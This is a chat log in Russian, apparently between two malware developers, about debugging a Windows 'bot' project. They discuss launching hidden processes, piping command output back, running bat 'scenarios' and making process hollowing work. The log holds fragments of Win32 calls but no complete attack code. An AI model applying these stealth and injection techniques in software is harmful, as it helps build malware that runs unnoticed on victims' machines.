Timestamp	From	To	Message
2020-08-28 10:27:29.974281	price	mushroom	хрень какая-то, более того у меня даже dll возврат довал
2020-08-28 10:28:56.187278	price	mushroom	был раньше, это я теперь от тебя знаю, что через rundll32 не выдаётся ничего, но когда не знал, то получал
2020-08-28 10:33:25.506012	mushroom	price	LPSTARTUPINFOA
2020-08-28 10:33:44.538113	mushroom	price	А программа у тебя юникод.
2020-08-28 10:33:59.542613	mushroom	price	STARTUPINFO si = { 0 };
2020-08-28 10:34:13.103470	mushroom	price	Создаёшь получается юникод STARTUPINFOW
2020-08-28 10:34:38.638660	mushroom	price	А передаёшь CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)
2020-08-28 10:34:48.634210	mushroom	price	LPSTARTUPINFOA
2020-08-28 10:35:05.037492	price	mushroom	спасибо
2020-08-28 10:35:35.746892	mushroom	price	Но это не факт что из-за этого, это я заметил, но не проверял.
2020-08-28 10:35:51.178833	price	mushroom	но с твоим тестом это не объясняет
2020-08-28 10:36:28.771171	mushroom	price	Ты так запутаешься или пиши всё в ANSI или всё в UNICODE, или используй унифвкрсальные версии функций и структур без A или W.
2020-08-28 10:36:51.095772	mushroom	price	Лучше в ANSI тогда размер файла меньше будет.
2020-08-28 10:38:05.189912	price	mushroom	у меня не все функции есть для Ansi, а  так конечно ты прав. Я сейчас с памятью повоевал, займусь и юникодом
2020-08-28 10:40:42.194043	mushroom	price	Тогда всё в юникод.
2020-08-28 10:40:56.322131	price	mushroom	ок
2020-08-28 10:41:00.561668	mushroom	price	В программе у тебы стоит использовать набор символов Юникода
2020-08-28 10:41:09.399652	price	mushroom	я знаю
2020-08-28 10:41:20.694685	mushroom	price	Значит всё что без A или W превращается в W
2020-08-28 10:41:23.191985	price	mushroom	если сменить на мультибайаты беда будет
2020-08-28 10:41:34.053749	price	mushroom	тоже знаю
2020-08-28 10:41:59.270621	mushroom	price	По этому я у себя использую универсальные названия, чтобы можно было легко менять кодировки.
2020-08-28 10:42:50.626347	mushroom	price	si.dwFlags = STARTF_USESHOWWINDOW
2020-08-28 10:42:55.509498	mushroom	price	А это зачем?
2020-08-28 10:43:06.411077	mushroom	price	si.wShowWindow = SW_HIDE;
2020-08-28 10:43:10.199923	mushroom	price	И это?
2020-08-28 10:43:32.752857	mushroom	price	Это легче сделать в функции создания процесса через флаг.
2020-08-28 10:44:19.021023	mushroom	price	CREATE_NO_WINDOW
2020-08-28 10:44:33.733668	mushroom	price	https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
2020-08-28 10:46:41.188224	mushroom	price	Просто info->dwFlags |= STARTF_USESTDHANDLES;
2020-08-28 10:47:01.544428	mushroom	price	Для пайпа, больше никакие флаги не нужны для startupinfo
2020-08-28 10:47:34.783792	price	mushroom	поправил
2020-08-28 10:48:33.651418	mushroom	price	Проверь сам чтобы было так, открыл проект выбрал bd6 x86\x64 собрать, всё собралось на автомате необходимое.
2020-08-28 10:48:55.652783	price	mushroom	проверяю
2020-08-28 10:49:20.790744	price	mushroom	сейчас флаги проверяю, на очереди зависимости
2020-08-28 10:49:31.815801	mushroom	price	Проверь как я говорил все hollowing возможные, сценарии, как я на прошлой неделе писал. И тогда пиши мне я посмотрю.
2020-08-28 10:50:46.760785	price	mushroom	хорошо
2020-08-28 10:50:48.782901	price	mushroom	спасибо
2020-08-28 11:17:52.407535	mushroom	price	Ближайшие пару часов смотреть нечего будет? Я отойду тогда.
2020-08-28 11:18:07.029741	price	mushroom	нет
2020-08-28 11:18:11.465113	price	mushroom	отходи
2020-08-28 11:18:18.561543	mushroom	price	OK.
2020-08-31 09:49:45.332160	mushroom	price	Привет. В проекте bd6 Компоновщик\Вввод\Дополнительные зависимости напиши $(SolutionDir)bin\$(PlatformTarget)\$(Configuration)\No_CRT_lib.lib
2020-08-31 09:50:10.641437	mushroom	price	Чтобы библиотека твоя находилась.
2020-08-31 09:50:11.234427	price	mushroom	привет
2020-08-31 09:50:25.630006	mushroom	price	Всё остальное пока так же не работает.
2020-08-31 09:50:37.464667	price	mushroom	вот это странно
2020-08-31 09:50:39.418881	mushroom	price	Холловинг не работает, сценарии не работают.
2020-08-31 09:50:44.339716	price	mushroom	это как раз я проверил
2020-08-31 09:50:54.887840	price	mushroom	холловинг не работает
2020-08-31 09:51:16.143533	price	mushroom	но 1 команда, 10, 11, 12  работают
2020-08-31 09:51:16.271817	mushroom	price	Я это и мел ввиду.
2020-08-31 09:51:39.607581	price	mushroom	сейчас занимаюсь холловинглм
2020-08-31 09:51:41.517319	mushroom	price	С сохранением на диск exe работает.
2020-08-31 09:51:57.348515	mushroom	price	Сценарии не работают.
2020-08-31 09:52:08.047422	mushroom	price	dbf20612adcd2353521bf5ef68c5a3a4
2020-08-31 09:52:39.362078	mushroom	price	Можешь там увидеть не один не сработал сценарий.
2020-08-31 09:53:26.207464	mushroom	price	Другое не проверял.
2020-08-31 09:53:40.164605	price	mushroom	хорошо
2020-08-31 09:53:50.460254	price	mushroom	проверяю
2020-08-31 09:54:49.050845	price	mushroom	вот про холловинг - это работающий в боте или просто пример?
2020-08-31 09:55:05.305597	price	mushroom	processhelper.cpp
2020-08-31 10:20:23.345567	mushroom	price	Работающий.
2020-08-31 10:20:33.963638	price	mushroom	ok
2020-09-01 11:25:30.175825	mushroom	price	Привет посмотрел что последнее на гитлаб. Сценарии заработали. Одна загвоздка со сценарием bat с диска. Если cd c:\\r\ndir\r\n запускать через пайп всё как надо получается, если с диска получается вывод другой (нету содержимого диска c:\). Вот последние 2 команды.
2020-09-01 11:25:56.794883	mushroom	price	Холловинг я так понял ещё ты не сделал, там такая же ошибка как вчера 87.
2020-09-01 11:25:58.900913	price	mushroom	Привет, спасибо за просмотр
2020-09-01 11:26:12.680189	price	mushroom	я сейчас делаю, завтра будем смотреть
2020-09-01 11:26:39.735501	price	mushroom	я вчера нашел ошибку у себя в освобождении кучи, она меня сильно беспокоила
2020-09-01 11:26:44.072609	price	mushroom	теперь нет
2020-09-01 11:26:53.677487	mushroom	price	OK&
2020-09-01 11:27:37.330321	price	mushroom	кроме ошибки (если будет время) интересную процедуру нашел
